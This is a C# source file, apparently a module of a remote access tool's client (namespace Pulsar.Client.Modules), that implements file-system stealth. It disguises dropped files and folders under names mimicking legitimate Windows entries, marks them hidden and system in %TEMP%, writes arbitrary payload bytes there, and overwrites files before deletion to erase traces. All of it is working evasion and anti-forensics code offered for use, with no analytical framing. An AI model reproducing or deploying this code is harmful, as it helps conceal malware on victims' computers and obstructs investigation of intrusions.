using System;
using System.IO;
using System.Text;

namespace Pulsar.Client.Modules
{
    /// <summary>
    /// File System Stealth Module
    /// Randomized temp folder names, obfuscated file names, secure cleanup.
    /// </summary>
    public static class StealthFileSystem
    {
        private static readonly Random _random = new Random();

        /// <summary>
        /// Generate a random folder name that looks legitimate.
        /// Uses common Windows folder naming patterns.
        /// </summary>
        public static string GenerateStealthFolderName()
        {
            string[] prefixes = { "ms", "net", "win", "sys", "tmp", "cache", "app", "data" };
            string[] suffixes = { "temp", "cache", "data", "tmp", "log", "sync", "update" };

            string prefix = prefixes[_random.Next(prefixes.Length)];
            string suffix = suffixes[_random.Next(suffixes.Length)];
            string guid = Guid.NewGuid().ToString("N").Substring(0, 8);

            return $"{prefix}_{suffix}_{guid}";
        }

        /// <summary>
        /// Generate a random file name that looks legitimate.
        /// </summary>
        public static string GenerateStealthFileName(string extension = ".tmp")
        {
            string[] words = { "update", "cache", "sync", "data", "log", "temp", "backup" };
            string word = words[_random.Next(words.Length)];
            string timestamp = DateTime.Now.ToString("yyyyMMddHHmmss");
            string random = _random.Next(1000, 9999).ToString();

            return $"{word}_{timestamp}_{random}{extension}";
        }

        /// <summary>
        /// Create a stealth temp directory in %TEMP%.
        /// </summary>
        public static string CreateStealthTempDir()
        {
            string basePath = Path.GetTempPath();
            string folderName = GenerateStealthFolderName();
            string fullPath = Path.Combine(basePath, folderName);

            if (!Directory.Exists(fullPath))
            {
                Directory.CreateDirectory(fullPath);
                // Set hidden attribute
                try
                {
                    var dirInfo = new DirectoryInfo(fullPath);
                    dirInfo.Attributes = FileAttributes.Hidden | FileAttributes.System;
                }
                catch { }
            }

            return fullPath;
        }

        /// <summary>
        /// Securely delete a file (overwrite before delete).
        /// </summary>
        public static void SecureDelete(string filePath)
        {
            try
            {
                if (File.Exists(filePath))
                {
                    // Overwrite with random data
                    var fileInfo = new FileInfo(filePath);
                    long length = fileInfo.Length;

                    using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Write))
                    {
                        byte[] randomData = new byte[4096];
                        _random.NextBytes(randomData);

                        for (long i = 0; i < length; i += 4096)
                        {
                            fs.Write(randomData, 0, (int)Math.Min(4096, length - i));
                        }
                    }

                    // Then delete
                    File.Delete(filePath);
                }
            }
            catch
            {
                // Fallback to normal delete
                try { File.Delete(filePath); } catch { }
            }
        }

        /// <summary>
        /// Securely delete a directory and all contents.
        /// </summary>
        public static void SecureDeleteDirectory(string dirPath)
        {
            try
            {
                if (Directory.Exists(dirPath))
                {
                    foreach (var file in Directory.GetFiles(dirPath, "*", SearchOption.AllDirectories))
                    {
                        SecureDelete(file);
                    }
                    Directory.Delete(dirPath, true);
                }
            }
            catch
            {
                // Fallback
                try { Directory.Delete(dirPath, true); } catch { }
            }
        }

        /// <summary>
        /// Write data to a stealth temp file.
        /// </summary>
        public static string WriteStealthTempFile(byte[] data, string extension = ".tmp")
        {
            string tempDir = CreateStealthTempDir();
            string fileName = GenerateStealthFileName(extension);
            string fullPath = Path.Combine(tempDir, fileName);

            File.WriteAllBytes(fullPath, data);

            // Set hidden attribute
            try
            {
                File.SetAttributes(fullPath, FileAttributes.Hidden | FileAttributes.System);
            }
            catch { }

            return fullPath;
        }
    }
}
